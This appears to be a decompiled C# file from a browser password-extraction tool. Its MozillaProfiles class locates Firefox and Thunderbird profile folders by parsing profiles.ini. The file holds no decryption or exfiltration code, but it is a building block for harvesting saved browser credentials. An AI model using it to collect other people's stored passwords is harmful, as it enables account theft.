using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;

namespace BrowserPasswords.MozillaPasswords
{
	// Token: 0x02000028 RID: 40
	public class MozillaProfiles : IEnumerable<MozillaProfile>
	{
		// Token: 0x0600013F RID: 319 RVA: 0x00004BF4 File Offset: 0x00002DF4
		public MozillaProfiles(MozillaSoft soft)
		{
			this.profiles = new List<MozillaProfile>();
			string text = null;
			switch (soft)
			{
			case MozillaSoft.FireFox:
				text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox";
				break;
			case MozillaSoft.Thunderbird:
				text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Thunderbird";
				break;
			}
			string path = text + "\\profiles.ini";
			if (File.Exists(path))
			{
				StreamReader streamReader = new StreamReader(path);
				string text2 = string.Empty;
				string name = string.Empty;
				string path2 = string.Empty;
				bool relative = false;
				text2 = streamReader.ReadLine();
				while (text2 != null)
				{
					if (text2.ToLower().StartsWith("[profile"))
					{
						text2 = streamReader.ReadLine();
						while (text2 != null && !text2.StartsWith("["))
						{
							if (text2.StartsWith("IsRelative="))
							{
								relative = (int.Parse(text2.Substring(11)) == 1);
							}
							else if (text2.StartsWith("Name="))
							{
								name = text2.Substring(5);
							}
							else if (text2.StartsWith("Path="))
							{
								path2 = text2.Substring(5);
							}
							text2 = streamReader.ReadLine();
						}
						this.profiles.Add(new MozillaProfile(soft, text, name, path2, relative));
					}
					else
					{
						text2 = streamReader.ReadLine();
					}
				}
			}
		}

		// Token: 0x1700007A RID: 122
		public MozillaProfile this[int index]
		{
			get
			{
				MozillaProfile result;
				if (index >= 0 && index < this.profiles.Count)
				{
					result = this.profiles[index];
				}
				else
				{
					result = null;
				}
				return result;
			}
		}

		// Token: 0x06000141 RID: 321 RVA: 0x00004D78 File Offset: 0x00002F78
		public IEnumerator<MozillaProfile> GetEnumerator()
		{
			return (IEnumerator<MozillaProfile>)this.profiles.GetEnumerator();
		}

		// Token: 0x06000142 RID: 322 RVA: 0x00004DA0 File Offset: 0x00002FA0
		public IEnumerator GetEnumerator1()
		{
			return (IEnumerator)this.profiles.GetEnumerator();
		}

		// Token: 0x0400011C RID: 284
		private List<MozillaProfile> profiles;
	}
}
